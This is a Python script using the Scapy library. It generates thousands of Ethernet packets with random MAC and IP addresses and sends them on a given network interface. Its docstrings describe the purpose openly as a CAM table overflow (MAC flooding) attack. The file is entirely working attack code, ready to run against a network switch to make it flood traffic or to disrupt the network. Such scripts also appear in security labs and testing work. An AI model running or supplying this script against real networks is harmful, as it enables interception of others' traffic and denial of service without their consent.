from scapy.all import Ether, IP, RandIP, RandMAC, sendp


def generate_packets(num_packets=10000):
    """
    Generates a list of random Ethernet packets for CAM table overflow attacks.

    Args:
        num_packets (int): Number of packets to generate.

    Returns:
        list: A list of Scapy Ethernet packets.
    """
    packet_list = []  # Initialize packet list
    for _ in range(num_packets):  # Use range for Python 3 compatibility
        packet = Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(), dst=RandIP())
        packet_list.append(packet)
    return packet_list


def cam_overflow(packet_list, iface='wlp0s20f3'):
    """
    Sends the list of packets at a high speed to overflow a CAM table.

    Args:
        packet_list (list): A list of Scapy Ethernet packets.
        iface (str): Network interface to send packets on.
    """
    try:
        sendp(packet_list, iface=iface, verbose=False)
    except Exception as e:
        print(f"Error sending packets: {e}")


if __name__ == '__main__':
    # Customize the number of packets and interface as needed
    num_packets = 10000
    interface = 'wlp0s20f3'

    print(f"Generating {num_packets} packets...")
    packet_list = generate_packets(num_packets)

    print(f"Sending packets on interface {interface}...")
    cam_overflow(packet_list, iface=interface)
    print("Packet sending completed.")
